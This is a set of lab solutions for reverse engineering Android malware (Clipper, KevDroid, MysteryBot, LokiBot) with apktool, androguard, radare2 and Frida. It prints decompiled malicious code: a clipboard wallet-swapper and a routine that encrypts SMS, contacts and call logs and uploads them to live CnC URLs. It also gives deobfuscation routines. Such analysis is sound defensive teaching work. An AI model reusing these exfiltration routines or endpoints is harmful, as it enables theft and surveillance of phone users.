% Solution of Labs
% Axelle Apvrille
% October 2018

# Lab 0: Reverse engineering of Android/Clipper.A!tr

This malware is very recent (appears in **August 2018**).
It detects crypto currency wallet addresses in the clipboard and replaces them by the attacker's wallet address.

1. [Doctor Web discovered a clipper Trojan for Android](https://news.drweb.com/show/?i=12739&lng=en)
2. [Dalvik Executable Format](https://source.android.com/devices/tech/dalvik/dex-format)

```
# unzip clipper.apk -d ./clipper-unzipped
```

Notice `./clipper-unzipped` contains:

- A Android binary XML: `AndroidManifest.xml`. Not understandable in this format.
- classes.dex: Dalvik executable. This contains the compiled code of the app.
- `resources.arsc`: compiled resources
- META-INF: generated when signing the package

```
root@af3b750c9549:~/clipper-unzipped# file AndroidManifest.xml 
AndroidManifest.xml: Android binary XML
root@af3b750c9549:~/clipper-unzipped# file classes.dex 
classes.dex: Dalvik dex file version 035
```

Normally, we should not have directories `com, mozilla, org, res`. Those are packaging errors of the malware author.
Some applications also have `./assets` (raw resources), `./lib` (external native libraries) - but this is not used by this sample.

## AndroidManifest.xml

Convert the binary XML file to a text XML:

```
# java -jar /opt/axmlprinter/build/libs/axmlprinter-0.1.7.jar ./AndroidManifest.xml > ./AndroidManifest.xml.text
```

The package name is `clipper.abcchannelmc.ru.clipperreborn`

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest
	xmlns:android="http://schemas.android.com/apk/res/android"
	com.htc.intent.action.QUICKBOOT_POWERON:versionCode="1"
	com.htc.intent.action.QUICKBOOT_POWERON:versionName="1.0"
	com.htc.intent.action.QUICKBOOT_POWERON:installLocation="1"
	package="clipper.abcchannelmc.ru.clipperreborn"
	>
```

The malware requests Android permissions specific to HTC devices.

```xml
	<uses-permission
		com.htc.intent.action.QUICKBOOT_POWERON:name="android.permission.INTERNET"
		>
	</uses-permission>
```

The **main activity** can be identified by searching for an activity with `android.intent.action.MAIN` and `android.intent.category.LAUNCHER`.
So, for this sample, it is `clipper.abcchannelmc.ru.clipperreborn.MainActivity` (the name won't always be `MainActivity` in all malware!).

```xml
<activity
			com.htc.intent.action.QUICKBOOT_POWERON:name="clipper.abcchannelmc.ru.clipperreborn.MainActivity"
			>
			<intent-filter
				>
				<action
					com.htc.intent.action.QUICKBOOT_POWERON:name="android.intent.action.MAIN"
					>
				</action>
				<category
					com.htc.intent.action.QUICKBOOT_POWERON:name="android.intent.category.LAUNCHER"
					>
				</category>
			</intent-filter>
		</activity>
```

We also notice:

- A receiver `clipper.abcchannelmc.ru.clipperreborn.BootCompletedReceiver`. A receiver is a class that is automatically called when a given action / intent filter occurs. In this case, the class will be called when the phone boots.
- A service `clipper.abcchannelmc.ru.clipperreborn.ClipboardService`. A service is code that executes in background.

## Running apktool

In the directory with `clipper.apk`:

```bash
# java -jar /opt/apktool/apktool.jar d -o ./clipper-apktool clipper.apk 
I: Using Apktool 2.3.3 on clipper.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
S: WARNING: Could not write to (/root/.local/share/apktool/framework), using /tmp instead...
S: Please be aware this is a volatile directory and frameworks could go missing, please utilize --frame-path if the default storage directory is unavailable
I: Loading resource table from file: /tmp/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
```

In `./clipper-apktool` dir, notice:

- AndroidManifest.xml has been converted. That's another way to do it.
- The [Dalvik](https://en.wikipedia.org/wiki/Dalvik_(software)) executable has been disassembled to Smali. Smali is a readable format of Dalvik bytecode. It has similarities with Java bytecode.
- Resources have been decompiled to `./res`

## Understanding Smali

In `clipper-apktool`, cd `./smali/clipper/abcchannelmc/ru/clipperreborn`, then look into `MainActivity.smali`

```
.class public Lclipper/abcchannelmc/ru/clipperreborn/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"
```

`.class` holds the full name of the class. `.super` says MainActivity inherits from `Activity`. `.source` contains the name of the source file: this field isn't provided in all cases.

```
.method public constructor <init>()V
    .locals 0

    .line 19
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void

```
This is the class's constructor. The method's signature name follows Java standards: it takes no parameters and returns void (V). The constructor does not do more than call the constructor of the class it inherits from. `invoke-direct` is bytecode to call a given method.

```
# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3

    .line 25
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
```

When an activity starts, the `onCreate()` method is called. The signature of this method shows it takes a `Bundle` as parameter, and returns void.
The bundle (passed as argument) is held in `p1`. Not in `p0`, because `p0` always holds `this` object.
So, we see that the method calls `onCreate()` of its parent, forwarding the bundle as parameter.

The `line` indications are mere indications of line number.
`.locals` is a directive to explain how many local variables the method uses. In this particular case, we have v0, v1 and v2, so  3 .
See [Registers](https://github.com/JesusFreke/smali/wiki/Registers).

## Reading Java sources

From `./clipper-unzipped` directory

```
# d2j-dex2jar.sh classes.dex 
dex2jar classes.dex -> ./classes-dex2jar.jar
Detail Error Information in File ./classes-error.zip
Please report this file to http://code.google.com/p/dex2jar/issues/entry if possible.
```

The errors unfortunately mean dex2jar has problems "converting" the DEX. But most of the sources are okay fortunately.

```
# java -jar /opt/jd-gui.jar ./classes-dex2jar.jar
```

Also, consider using the `/opt/extract.sh` script.

## Androguard

```
# androlyze -s
Androlyze version 3.0
In [1]: a, d, dx = AnalyzeAPK('clipper.apk', decompiler='dad')
In [2]: a.get_main_activity()
Out[2]: u'clipper.abcchannelmc.ru.clipperreborn.MainActivity'
In [4]: d.CLASS_Lclipper_abcchannelmc_ru_clipperreborn_MainActivity.source()            
package clipper.abcchannelmc.ru.clipperreborn;
public class MainActivity extends android.app.Activity {

    public MainActivity()
    {
        return;
    }

    protected void onCreate(android.os.Bundle p4)
    {
        super.onCreate(p4);
        new Thread(new clipper.abcchannelmc.ru.clipperreborn.MainActivity$1(this)).start();
        this.startService(new android.content.Intent(this, clipper.abcchannelmc.ru.clipperreborn.ClipboardService));
        android.util.Log.d("Clipper", "Started ClipboardManager");
        this.getPackageManager().setComponentEnabledSetting(new android.content.ComponentName(this, clipper.abcchannelmc.ru.clipperreborn.MainActivity), 2, 1);
        android.widget.Toast.makeText(this, this.getResources().getString(2131427368), 0).show();
        this.finish();
        return;
    }
}
```

We see the malware starts a **ClipboardService**

```java
this.startService(new android.content.Intent(this, clipper.abcchannelmc.ru.clipperreborn.ClipboardService));
```

and erases the application's icon

```java
this.getPackageManager().setComponentEnabledSetting(new android.content.ComponentName(this, clipper.abcchannelmc.ru.clipperreborn.MainActivity), 2, 1);
```

We inspect the ClipboardService. A listener is added and will be called each time the clipboard changes.

```
In [5]: d.CLASS_Lclipper_abcchannelmc_ru_clipperreborn_ClipboardService.METHOD_onCreate.source()
public void onCreate()
    {
        super.onCreate();
        this.mClipboardManager = ((android.content.ClipboardManager) this.getSystemService("clipboard"));
        this.mClipboardManager.addPrimaryClipChangedListener(this.mOnPrimaryClipChangedListener);
        return;
    }
```

The field `this.mOnPrimaryClipChangedListener` is used in 3 functions. 

```
In [6]: d.CLASS_Lclipper_abcchannelmc_ru_clipperreborn_ClipboardService.FIELD_mOnPrimaryClipChangedListener.show_dref()
########## DREF
R: Lclipper/abcchannelmc/ru/clipperreborn/ClipboardService; onCreate ()V 1e
R: Lclipper/abcchannelmc/ru/clipperreborn/ClipboardService; onDestroy ()V 12
W: Lclipper/abcchannelmc/ru/clipperreborn/ClipboardService; <init> ()V 20
####################
```

It's in the `init` (constructor) that the listener is instantiated:

```
In [7]: d.CLASS_Lclipper_abcchannelmc_ru_clipperreborn_ClipboardService.METHOD_init.source()
public ClipboardService()
    {
        this.w = "";
        this.gate = "http://fastfrmt.beget.tech/clipper/gateway/";
        this.mOnPrimaryClipChangedListener = new clipper.abcchannelmc.ru.clipperreborn.ClipboardService$3(this);
        return;
    }
 d.CLASS_Lclipper_abcchannelmc_ru_clipperreborn_ClipboardService_3.METHOD_onPrimaryClipChanged.source()
public void onPrimaryClipChanged()
    {
        clipper.abcchannelmc.ru.clipperreborn.ClipboardService v0_3 = clipper.abcchannelmc.ru.clipperreborn.ClipboardService.access$100(this.this$0).getText().toString();
        if (!v0_3.equals(clipper.abcchannelmc.ru.clipperreborn.ClipboardService.access$000(this.this$0))) {
            android.util.Log.d("Clipper", "Copied");
            String v1_5 = v0_3.substring(0, 1);
            int v3_1 = new StringBuilder();
            v3_1.append(v0_3);
            v3_1.append(" | ");
...
```

This listener contains the malicious payload. It grabs the current content of the clipboard and looks by which characters it begins, and tries to guess if this is a crypto currency wallet address and for which crypto currency.

```
if ((!clipper.abcchannelmc.ru.clipperreborn.ClipboardService.access$100(this.this$0).getText().toString().contains("+7"))
  || (clipper.abcchannelmc.ru.clipperreborn.ClipboardService.access$100(this.this$0).getText().length() != 12)) {
  if ((!v1_5.contains("7")) ||
     (clipper.abcchannelmc.ru.clipperreborn.ClipboardService.access$100(this.this$0).getText().length() != 11)) {
...
```

- Begins with 7 and length 12: Visa QIWI wallet
- Begins with 4: Yandex
- Begins with Z: WebMoney US dollar
- Begins with R: WebMoney Russian Rubles
- Begins with 4 and length 95: Monero
- Begins with 1 or 3 and length 34: Bitcoin
- Begins with X and length 34: Dash
- D and length = 34 -> Doge
- t and length = 35 -> ZEC = ZCash
- 0x and length = 40 -> ETH = Ether
- L and length = 34 -> LTC = Litecoin
- B and length = 34 -> BLK = BlackCoin

We noticed earlier a URL: `this.gate = "http://fastfrmt.beget.tech/clipper/gateway/";`. Let's search where `this.gate` is used.

```
d.CLASS_Lclipper_abcchannelmc_ru_clipperreborn_ClipboardService.FIELD_gate.show_dref()
########## DREF
R: Lclipper/abcchannelmc/ru/clipperreborn/MainActivity$1; run ()V a
R: Lclipper/abcchannelmc/ru/clipperreborn/ClipboardService$1; run ()V e
R: Lclipper/abcchannelmc/ru/clipperreborn/ClipboardService$2; run ()V e
W: Lclipper/abcchannelmc/ru/clipperreborn/ClipboardService; <init> ()V 12
####################
In [11]: d.CLASS_Lclipper_abcchannelmc_ru_clipperreborn_ClipboardService_1.METHOD_run.source()
public void run()
    {
        try {
            java.io.IOException v0_1 = new StringBuilder();
            v0_1.append(this.this$0.gate);
            v0_1.append("attach.php?log&wallet=");
            v0_1.append(this.val$wallet);
            v0_1.append("&was=");
            v0_1.append(this.val$ne);
            clipper.abcchannelmc.ru.clipperreborn.HttpClient.getReq(v0_1.toString());
            android.util.Log.d("Clipper", "New log");
        } catch (java.io.IOException v0_4) {
            v0_4.printStackTrace();
        } catch (java.io.IOException v0_5) {
            v0_5.printStackTrace();
        }
        return;
    }
```
This is where the original and new wallet address is sent to a remote CnC.

# Lab 1: Reverse engineering of Android/KevDroid


## Q1. Convert the Android Manifest to a readable format

```
# java -jar /opt/apktool/apktool.jar d -o ./reaper-apktool ./reaper.apk
I: Using Apktool 2.3.3 on reaper.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
S: WARNING: Could not write to (/root/.local/share/apktool/framework), using /tmp instead...
S: Please be aware this is a volatile directory and frameworks could go missing, please utilize --frame-path if the default storage directory is unavailable
I: Loading resource table from file: /tmp/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
# cd reaper-apktool/
# more AndroidManifest.xml
```

## Q2. What is the name of the main activity?

It is `cake.com.update.activity.MainActivity`.

```xml
   <activity android:name="cake.com.update.activity.MainActivity" android:theme="@style/Theme.AppTheme">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
```

## Q3. List services and receivers

```
# grep service AndroidManifest.xml 
        <service android:name="cake.com.update.services.CaptureCallService"/>
root@90b58e6bc8f4:~/reaper-apktool# grep -E "service|receiver" AndroidManifest.xml 
        <receiver android:name="cake.com.update.receivers.CallReceiver">
        </receiver>
        <service android:name="cake.com.update.services.CaptureCallService"/>
        <receiver android:name="cake.com.update.receivers.AlarmReceiver">
        </receiver>
        <receiver android:name="cake.com.update.receivers.StartReceiver">
        </receiver>
```

- service: cake.com.update.services.CaptureCallService
- receivers: cake.com.update.receivers.CallReceiver, cake.com.update.receivers.AlarmReceiver, cake.com.update.receivers.StartReceiver

## Q4. Use androguard to decompile correctly onReceive() of AlarmReceiver

```
# androlyze -s 
Androlyze version 3.0
In [1]: a, d, dx = AnalyzeAPK('reaper.apk', decompiler='dad')
In [2]: d.CLASS_Lcake_com_update_receivers_AlarmReceiver.METHOD_onReceive.source()
public void onReceive(android.content.Context p9, android.content.Intent p10)
    {
        if (p10.getAction() == "cake.com.update.action.AlarmManager") {
            String v4_2 = new Object[3];
            v4_2[0] = this.getClass().getSimpleName();
            v4_2[1] = new cake.com.update.receivers.AlarmReceiver$1(this).getClass().getEnclosingMethod().getName();
            v4_2[2] = p10;
            cake.com.update.utilities.MyLog.d("[%s::%s]  intent=%s", v4_2);
...
```

## Q5. First lines of onReceive()

```
java.io.File v1_1 = new java.io.File(android.os.Environment.getExternalStorageDirectory(), "/icloud/tmp-ord/");
            java.io.File v2_1 = new java.io.File(android.os.Environment.getExternalStorageDirectory(), "/icloud/tmp-ord.dat");
            try {
                cake.com.update.libraries.FileHelper.writeTextToFile(new StringBuilder().append(v1_1.getAbsolutePath()).append("/Account.txt").toString(), this.getAllAccounts().toString());
                cake.com.update.libraries.FileHelper.writeTextToFile(new StringBuilder().append(v1_1.getAbsolutePath()).append("/Sms.txt").toString(), this.getAllSMSJSON().toString());
                cake.com.update.libraries.FileHelper.writeTextToFile(new StringBuilder().append(v1_1.getAbsolutePath()).append("/Contact.txt").toString(), this.getAllContactsJSON().toString());
                cake.com.update.libraries.FileHelper.writeTextToFile(new StringBuilder().append(v1_1.getAbsolutePath()).append("/Calllog.txt").toString(), this.getCallLogJSON().toString());
```

It is creating various files on the external SD card such as `/sdcard/icloud/tmp-ord/Account.txt` and copying data from the smartphone in those files.

- Account.txt: lists all accounts on the phone with name, type and created date.
- Sms.txt: number, name, type, datetime, body
- Contact.txt: name, phone number, email address and photo
- Calllog.txt: call log...

## Q6. Middle lines.  What is the algorithm? What is the key?

The files gathered previously are zipped and encrypted.
The encryption algorithm is AES. You need to go and see `CryptHelper.encryptFile()` to see that.
The key is `08D03B0B6BE7FBCD`

FYI, after the files are zipped and encrypted they are sent to the CnC:

```java
if (!this.m_uploading) {
                String v4_27 = new Void[0];
                new cake.com.update.receivers.AlarmReceiver$2(this).execute(v4_27);
```

The execute() method does in background:

```java
d.CLASS_Lcake_com_update_receivers_AlarmReceiver_2.METHOD_doInBackground_Ljava_lang_VoidLjava_lang_Boolean.source()

    protected varargs Boolean doInBackground(Void[] p11)
    {
        Boolean v5_17;
        String v0 = new StringBuilder().append(cake.com.update.receivers.AlarmReceiver.access$100(this.this$0)).append("____").append(cake.com.update.libraries.FileHelper.getSimpleName(new java.text.SimpleDateFormat("dd-MM-yyyy_hh:mm:ss").format(new java.util.Date()))).toString();
        String v6_8 = new Object[3];
        v6_8[0] = "http://cgalim.com/admin/hr/pu/pu.php?do=upload";
        v6_8[1] = "_file";
        v6_8[2] = v0;
        cake.com.update.utilities.MyLog.d("----start uploading, url=%s, an=%s, afn=%s", v6_8);
        String v3 = cake.com.update.libraries.NetHelper.uploadFile(new StringBuilder().append(android.os.Environment.getExternalStorageDirectory()).append("/icloud/tmp-ord.dat-enc").toString(), "http://cgalim.com/admin/hr/pu/pu.php?do=upload", "_file", v0);
```

## Q7. What does the CallReceiver do?

This receiver is called when the smartphone starts an outgoing call or gets an incoming call.

```
 <receiver android:name="cake.com.update.receivers.CallReceiver">
            <intent-filter>
                <action android:name="android.intent.action.PHONE_STATE"/>
                <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
            </intent-filter>
```

In that case, the `onReceive()` method of CallReceiver gets called.
It retrieves the phone number which is dialed or incoming.
It calls `CaptureCallService` with extra parameters:

- command type
- phone number

In `CaptureCallService`, the call is recorded (see onStartCommand()) and stored in a .amr audio file in the /icloud/tmp-ord directory.
The file is encrypted.
It will be leaked to the CnC with other data.

# Lab 2: De-obfuscating Android/MysteryBot

## Question 1

```java
 public void A() {
        Intent v0 = new Intent(P.ALLATORIxDEMO("T,Q0Z+QlT2ElT!A+Z,\u001B\u0003q\u0006j\u0006p\u0014|\u0001p\u001Dt\u0006x\u000B{"));
        v0.putExtra(H.ALLATORIxDEMO("*~/b$y/>*`;>.h?b*>\u000FU\u001DY\bU\u0014Q\u000F]\u0002^"), MainActivity.ALLATORIxDEMO);  
        v0.putExtra(P.ALLATORIxDEMO("T,Q0Z+QlT2ElP:A0Tlt\u0006q\u001Dp\u001Ae\u000Et\ft\u0016|\r{"), H.ALLATORIxDEMO("D$0>`/q?ukd#ukf.b8y$~"));
        v0.putExtra(P.ALLATORIxDEMO("$Z0V\'\u0018.Z!^\'Q"), 3);
```

- The malware uses the *Allatori* Java obfuscator
- Note that the obfuscated strings contain **Unicode** (`\uxxxx`): `T,Q0Z+QlT2ElT!A+Z,\u001B\u0003q\u0006j\u0006p\u0014|\u0001p\u001Dt\u0006x\u000B{`
- Sometimes, the code calls `P.ALLATORIxDEMO`, other times, `H.ALLATORIxDEMO`. If we look in the code, we'll some other instances.

We investigate `P.ALLATORIxDEMO`. Basically, this routine decodes the obfuscated string from the end. The first character is decrypted with XOR 53, the second with 66. Etc. If we inspect `H.ALLATORIxDEMO`, the only thing that changes are the XOR constants (16 and 75)

### Java implementation

```java
import java.io.*;

public class Allatori {
    public static String demo(int one, int two, String arg4) {
        int v0 = arg4.length();
        char[] v1 = new char[v0];
        --v0;
        while(v0 >= 0) {
            int v3 = v0 - 1;
            v1[v0] = ((char)(arg4.charAt(v0) ^ one));
            if(v3 < 0) {
                break;
            }

            v0 = v3 - 1;
            v1[v3] = ((char)(arg4.charAt(v3) ^ two));
        }

        return new String(v1);
    }

    public static void main(String [] args) {
	System.out.println(Allatori.demo(53,66,"T,Q0Z+QlT2ElT!A+Z,\u001B\u0003q\u0006j\u0006p\u0014|\u0001p\u001Dt\u0006x\u000B{"));
	System.out.println(Allatori.demo(16,75,"*~/b$y/>*`;>.h?b*>\u000FU\u001DY\bU\u0014Q\u000F]\u0002^"));
	System.out.println(Allatori.demo(53,66,"T,Q0Z+QlT2ElP:A0Tlt\u0006q\u001Dp\u001Ae\u000Et\ft\u0016|\r{"));
	System.out.println(Allatori.demo(16,75,"D$0>`/q?ukd#ukf.b8y$~"));
	System.out.println(Allatori.demo(53,66, "$Z0V\'\u0018.Z!^\'Q"));
    }
	
}
```

Compile and run the program:

```
android.app.action.ADD_DEVICE_ADMIN
android.app.extra.DEVICE_ADMIN
android.app.extra.ADD_EXPLANATION
To update the version
force-locked
```

### Python implementation

```python
def demo(thestring, x1=53, x2=66):
    decoded = ''
    index = len(thestring) -1
    while (index >=0):
        decoded = chr(ord(thestring[index]) ^ x1) + decoded
        if (index - 1) < 0:
            break
        index = index - 1
        decoded = (chr(ord(thestring[index]) ^ x2)) + decoded
        index = index - 1
    return decoded

s = 'T,Q0Z+QlT2ElT!A+Z,\u001B\u0003q\u0006j\u0006p\u0014|\u0001p\u001Dt\u0006x\u000B{'
print demo(s.decode('unicode-escape'))
```

## Question 2

```python
fragment = ctx.getFocusedView().getActiveFragment()
if not fragment:
    print "Select a view and the active fragment"
    return
        
selectedstring = fragment.getActiveItemAsText()
if not selectedstring:
    print("Select a string to de-obfuscate")
    return
```

## Question 3

```python
    def get_args(self, ctx, caption):
        # ask user how to configure the de-obfuscation routine
        # caption is the title to display
        # returns two ints
        default_x1 = '53'
        default_x2 = '66'
        x1 = ctx.displayQuestionBox(caption, 'x1= (default is %s)' % (default_x1), default_x1)
        x2 = ctx.displayQuestionBox(caption, 'x2= (default is %s)' % (default_x2), default_x2)
        
        return int(x1), int(x2)
```	

## Question 4

See `./solutions/JEBAllatori.py`


# Lab 3: Android/LokiBot

## Using Radare2

```
# unzip lokibot.apk -d lokibot-unzipped
# cd lokibot-unzipped
# java -jar /opt/axmlprinter/build/libs/axmlprinter-0.1.7.jar AndroidManifest.xml > AndroidManifest.xml.text
# grep -C 7 MAIN AndroidManifest.xml.text
```

The main activity is `fsdfsdf.gsdsfsf.gjhghjg.lbljhkjblkjblkjblkj.MainActivity`.

## Question 1

```
# r2 classes.dex
[0x00024cdc]> aa
[0x00024cdc]> afl~MainActivity
0x00028668    1 8            sym.Lfsdfsdf_gsdsfsf_gjhghjg_lbljhkjblkjblkjblkj_MainActivity.method._init___V
0x00028680    1 106          sym.Lfsdfsdf_gsdsfsf_gjhghjg_lbljhkjblkjblkjblkj_MainActivity.method.abideasfasfasfasfafa__V
0x00028714    9 62           sym.Lfsdfsdf_gsdsfsf_gjhghjg_lbljhkjblkjblkjblkj_MainActivity.method.onActivityResult_IILandroid_content_Intent__V
0x00028764    6 298          method.Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/MainActivity.Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/MainActivity.method.onCreate(Landroid/os/Bundle;)V
```

The methods of MainActivity are:

- a constructor which returns void
- `void abideasfasfasfasfafa()` 
- `void onActivityResult(int, int, Intent)`
- `void onCreate(Bundle)`

## Question 2

```
[0x00024cdc]> pdf @ sym.Lfsdfsdf_gsdsfsf_gjhghjg_lbljhkjblkjblkjblkj_MainActivity.method._init___V
|           ;-- method.public.constructor.Lfsdfsdf_gsdsfsf_gjhghjg_lbljhkjblkjblkjblkj_MainActivity.Lfsdfsdf_gsdsfsf_gjhghjg_lbljhkjblkjblkjblkj_MainActivity.method._init___V:
/ (fcn) sym.Lfsdfsdf_gsdsfsf_gjhghjg_lbljhkjblkjblkjblkj_MainActivity.method._init___V 8
|   sym.Lfsdfsdf_gsdsfsf_gjhghjg_lbljhkjblkjblkjblkj_MainActivity.method._init___V ();
|           0x00028668      701000000000   invoke-direct {v0}, Landroid/app/Activity.<init>()V ; 0x0
\           0x0002866e      0e00           return-void
```

The constructor simply calls the constructor of the Activity class it inherits from.

## Question 3

```
[0x00025900]> afl~CommandService
0x000258cc    1 34           sym.Lfsdfsdf_gsdsfsf_gjhghjg_lbljhkjblkjblkjblkj_CommandService.method._init___V
0x00025900   49 3066 -> 3054 method.Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/CommandService.Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/CommandService.method.abideasfasfasfasfafa()V
0x00026534    1 8            sym.Lfsdfsdf_gsdsfsf_gjhghjg_lbljhkjblkjblkjblkj_CommandService.method.onCreate__V
0x0002654c    1 12           sym.Lfsdfsdf_gsdsfsf_gjhghjg_lbljhkjblkjblkjblkj_CommandService.method.onHandleIntent_Landroid_content_Intent__V
0x00026584    1 10           sym.Lfsdfsdf_gsdsfsf_gjhghjg_lbljhkjblkjblkjblkj_CommandService.method.onStartCommand_Landroid_content_Intent_II_I
```

So, the address of `abideasfasfasfasfafa()` is `0x00025900`.

## Question 4

We place ourselves at the beginning of the function (`s`), then we disassemble the function (`pdf`) and grep for things that begin with `str.`
```
[0x00024cdc]> s 0x00025900
[0x00025900]> pdf~str.
|      ::   0x00025934      1a00b500       const-string v0, str.f.j_f_s7o1 ; 0x2d47c ; "\r<f.j;f\as7o1`!"
|    :|::   0x0002596e      1a042d05       const-string v4, str.h_z_v9q ; 0x342bd
|  :|:|::   0x000259b6      1a073c05       const-string v7, str.http:__185.206.145.22_sfdsdfsdf ; 0x343b3 ; " http://185.206.145.22/sfdsdfsdf/"
|  :|:|::   0x000259cc      1a078a04       const-string v7, str.d9w___k ; 0x33813
| |:|:|::   0x00025aca      1a060303       const-string v6, str.P_m___N ; 0x31917
| |:|:|::   0x00025ae6      1a069a06       const-string v6, str.6v5a_qe ; 0x35750
| |:|:|::   0x00025af2      1a079906       const-string v7, str.f_we   ; 0x35748
| |:|:|::   0x00025b98      1a06f500       const-string v6, str.D_w0j_w7q1 ; 0x2d8a7 ; "\
...
```

## Question 5

```
[0x00025900]> Cs.. @ str.f.j_f_s7o1
ascii[13] "<f.j;f\as7o1`!"
[0x00025900]> Cs. @ str.f.j_f_s7o1
"<f.j;f\as7o1`!"
```

The string contains "<f.j;f\as7o1`!". It is obfuscated.

## Question 6

The solution for the script is in `./data/solutions/r2loki.py`

Here are a few de-obfuscated strings:

```
[0x00025900]> #!pipe python ../r2loki.py str.f.j_f_s7o1
Estimated length:  13
Obfuscated hex bytes:  3c662e6a3b660773376f316021
De-obfuscated Result:  device_policy
[0x00025900]> #!pipe python ../r2loki.py str.h_z_v9q
Estimated length:  8
Obfuscated hex bytes:  683d7a3f7639713c
De-obfuscated Result:  keyguard
[0x000342be]> #!pipe python ../r2loki.py str.d9w___k
Estimated length:  8
Obfuscated hex bytes:  6439773d2d286b28
De-obfuscated Result:  gate.php
[0x00033814]> #!pipe python ../r2loki.py str.P_m___N
Estimated length:  8
Obfuscated hex bytes:  503d6d3c5c0b4e0b
De-obfuscated Result:  Send_SMS
```

## Question 7

The solution is in `./data/solutions/lokifrida1.js` on the USB key.

## Question 8

```
root@90b58e6bc8f4:~# adb shell pm list packages
package:com.android.smoketest
package:com.android.cts.priv.ctsshim
package:com.google.android.youtube
...
package:fsdfsdf.gsdsfsf.fsdfsdf.lbljhkjblkjblkjblkj
...
```

The package name is `fsdfsdf.gsdsfsf.fsdfsdf.lbljhkjblkjblkjblkj`

So, we launch:

```
# frida -D emulator-5554 -l lokifrida1.js -f fsdfsdf.gsdsfsf.fsdfsdf.lbljhkjblkjblkjblkj --no-pause
     ____
    / _  |   Frida 12.0.8 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at http://www.frida.re/docs/home/
Spawning `fsdfsdf.gsdsfsf.fsdfsdf.lbljhkjblkjblkjblkj`...         
*] Loading Frida script for Android/LokiBot
[*] Java is available
Spawned `fsdfsdf.gsdsfsf.fsdfsdf.lbljhkjblkjblkjblkj`. Resuming main thread!
[Android Emulator 5554::fsdfsdf.gsdsfsf.fsdfsdf.lbljhkjblkjblkjblkj]-> [*] loaded hooks
de-obfuscating: n!m9n= to: myname
de-obfuscating: zm,f6w
                        f*u1`= to: MyIntentService
de-obfuscating: d9w=-(k( to: gate.php
de-obfuscating: (k7m= to: phone
de-obfuscating: bd=wj6i=`,pbw*v= to: :get_injects:true
de-obfuscating: h to: 0
de-obfuscating: <f.j;fs7o1`! to: device_policy
de-obfuscating: h to: 0
de-obfuscating: h=z?v9q< to: keyguard
de-obfuscating: h to: 0
de-obfuscating: i to: 1
de-obfuscating: d9w=-(k( to: gate.php
de-obfuscating: se to: p=
de-obfuscating: (k7m= to: phone
de-obfuscating: b to: :
de-obfuscating: b to: :
[Android Emulator 5554::fsdfsdf.gsdsfsf.fsdfsdf.lbljhkjblkjblkjblkj]-> quit
```

Note, you might sometimes get errors with Frida like **"Failed to spawn: timeout was reached"**
or **"Failed to load script: the connection is closed"**

## Question 9

The solution is on the USB key in `./data/solutions/lokifrida2.js`

If the Loki process is still up, run `frida -D emulator-5554 -l lokifrida2.js -n fsdfsdf.gsdsfsf.fsdfsdf.lbljhkjblkjblkjblkj --no-pause`,
otherwise `frida -D emulator-5554 -l lokifrida2.js -f fsdfsdf.gsdsfsf.fsdfsdf.lbljhkjblkjblkjblkj --no-pause` (notice `-n` or `-f`).

```
# frida -D emulator-5554 -l lokifrida2.js -n fsdfsdf.gsdsfsf.fsdfsdf.lbljhkjblkjblkjblkj --no-pause
     ____
    / _  |   Frida 12.0.8 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at http://www.frida.re/docs/home/
Attaching...                                                            
[*] Loading Frida script for Android/LokiBot
[*] Java is available
[*] loaded hooks
[Android Emulator 5554::fsdfsdf.gsdsfsf.fsdfsdf.lbljhkjblkjblkjblkj]-> decoding: h --> 0
Call Stack: dalvik.system.VMStack.getThreadStackTrace(Native Method)
java.lang.Thread.getStackTrace(Thread.java:1566)
fsdfsdf.gsdsfsf.gjhghjg.lbljhkjblkjblkjblkj.absurdityasfasfasfasfafa.abideasfasfasfasfafa(Native Method)
fsdfsdf.gsdsfsf.gjhghjg.lbljhkjblkjblkjblkj.CommandService.abideasfasfasfasfafa(Unknown Source)
fsdfsdf.gsdsfsf.gjhghjg.lbljhkjblkjblkjblkj.CommandService.onHandleIntent(Unknown Source)
android.app.IntentService$ServiceHandler.handleMessage(IntentService.java:68)
android.os.Handler.dispatchMessage(Handler.java:102)
android.os.Looper.loop(Looper.java:154)
android.os.HandlerThread.run(HandlerThread.java:61)

decoding: <f.j;fs7o1`! --> device_policy
Call Stack: dalvik.system.VMStack.getThreadStackTrace(Native Method)
java.lang.Thread.getStackTrace(Thread.java:1566)
fsdfsdf.gsdsfsf.gjhghjg.lbljhkjblkjblkjblkj.absurdityasfasfasfasfafa.abideasfasfasfasfafa(Native Method)
fsdfsdf.gsdsfsf.gjhghjg.lbljhkjblkjblkjblkj.CommandService.abideasfasfasfasfafa(Unknown Source)
fsdfsdf.gsdsfsf.gjhghjg.lbljhkjblkjblkjblkj.CommandService.onHandleIntent(Unknown Source)
android.app.IntentService$ServiceHandler.handleMessage(IntentService.java:68)
android.os.Handler.dispatchMessage(Handler.java:102)
android.os.Looper.loop(Looper.java:154)
android.os.HandlerThread.run(HandlerThread.java:61)
```

